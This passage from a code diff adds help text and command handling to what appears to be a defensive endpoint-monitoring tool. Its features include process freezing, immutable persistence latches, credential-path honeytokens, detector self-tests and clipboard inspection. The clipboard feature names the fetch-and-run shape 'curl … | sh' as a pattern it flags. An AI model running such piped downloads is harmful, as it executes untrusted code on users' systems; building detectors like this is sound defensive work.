+                   Never suspends your shell, terminal, or Aegis's own chain.
+                   Auto-releases after 15 min if unreviewed (fail-OPEN).
+  frozen           the review queue — adjudicate when YOU choose, not mid-attack
+  thaw [id|all]    release a frozen tree
+  latch [on|off|status]
+                   pre-claim the persistence surfaces so a dropper's write
+                   FAILS: `chflags uchg` (macOS) / deny-write ACE (Windows) —
+                   both settable by the owner with no privilege. On Linux this
+                   is a mode change only (chattr +i needs CAP_LINUX_IMMUTABLE),
+                   which is a speed bump, not a block, and is labelled as one.
+                   A latch cleared with no authorized `unlatch` is HIGH: nothing
+                   benign clears it.
+  unlatch <path>   open one surface for a real installer. Requires an
+                   interactive terminal and a typed one-time code — a script
+                   cannot satisfy it, which is what keeps the cleared-latch
+                   signal meaningful.
+  decoy [plant|remove]
+                   FIFO honeytokens at credential-shaped paths (POSIX only;
+                   absent on Windows). A read BLOCKS, and any read at all is an
+                   attacker by construction — nothing legitimate knows they
+                   exist. Never replaces a file that already exists.
+  assay            run the positive controls: prove each detector still fires
+                   against a known-good synthetic stimulus, and record what is
+                   currently PROVEN vs merely asserted. No EICAR is used —
+                   waking a third-party AV would cascade into Aegis's own
+                   sensors. A control unproven past its half-life is reported
+                   as unproven coverage, never as a clean result.
+  notary [verify|append]
+                   hash-chain Aegis's own state, anchored into the OS log store
+                   (root-owned: a same-uid attacker may append but cannot edit
+                   or erase). Erasure-resistant, only partly forgery-resistant —
+                   `verify` prints exactly which of the two it proved.
+  clipboard [check|guard|restore]
+                   inspect the clipboard for pasted-command attack shapes before
+                   you paste. `guard` substitutes an inert comment ONLY for
+                   patterns with no legitimate use; `curl … | sh` is documented
+                   installer syntax and is reported, never silently rewritten.
+                   Non-matching clipboard content is never logged or persisted.
+
+ DEVELOPER (measurement tooling, read-only)
+  rehunt [days]    re-run TODAY's detectors over stored RAW snapshots and report
+                   what they would have caught, with silent-miss latency
+                   (`replay` re-runs correlation over findings; this re-runs the
+                   detectors over what those findings were derived from)
+  backtest [cat]   score a detection category against this machine's own typed
+                   dismissals. REFUSES below 20 labels rather than reporting a
+                   precision figure built on noise
 """
 
 
@@ -10074,6 +11769,34 @@ def main(argv):
         return cmd_sandbox(argv[2], argv[3:])
     if cmd == "neutralize" and len(argv) > 2:
         return cmd_neutralize(argv[2])
+    # --- protective tier (opt-in, by-hand) ---
+    if cmd == "freeze" and len(argv) > 2:
+        return cmd_freeze(argv[2])
+    if cmd == "thaw":
+        return cmd_thaw(argv[2] if len(argv) > 2 else None)
+    if cmd == "frozen":
+        return cmd_frozen()
+    if cmd == "latch":
+        return cmd_latch(argv[2] if len(argv) > 2 else "on")
+    if cmd == "unlatch":
+        return cmd_unlatch(argv[2] if len(argv) > 2 else None)
+    if cmd == "decoy":
+        return cmd_decoy(argv[2] if len(argv) > 2 else "plant")
+    if cmd == "assay":
+        return cmd_assay()
+    if cmd == "notary":
+        return cmd_notary(argv[2] if len(argv) > 2 else "verify")
+    if cmd == "clipboard":
+        return cmd_clipboard(argv[2] if len(argv) > 2 else "check")
+    if cmd == "rehunt":
+        try:
+            days = int(argv[2]) if len(argv) > 2 else 30
+        except ValueError:
+            print("usage: aegis.py rehunt [days]")
+            return 1
+        return cmd_rehunt(days)
+    if cmd == "backtest":
+        return cmd_backtest(argv[2] if len(argv) > 2 else None)
     sys.stdout.write(HELP)
     return 0
 
